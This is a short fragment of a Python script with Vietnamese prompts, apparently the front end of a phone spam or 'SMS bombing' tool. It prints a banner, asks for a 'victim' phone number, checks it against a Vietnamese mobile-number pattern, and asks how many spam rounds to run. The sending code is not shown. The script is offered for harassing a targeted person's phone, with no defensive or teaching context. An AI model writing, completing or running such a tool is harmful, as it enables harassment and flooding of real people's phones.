...
def banner():
  ...
  for h in ban:
    ...
    time.sleep(0.003)
banner()
sdt = input(f"{trang}Nhập số điện thoại victim: {vang}")
while not re.search("^(0?)(3[2-9]|5[6|8|9]|7[0|6-9]|8[0-6|8|9]|9[0-4|6-9])[0-9]{7}$",sdt):
  print(f"{do}Nhập sai định dạng số")
  sdt = input("Nhập số điện thoại victim: ")
count = int(input("\033[1;37mNhập số lần muốn spam: \033[1;33m"))
if sdt == "0123456789":
  print(f"{do}Error!!!")
  quit()
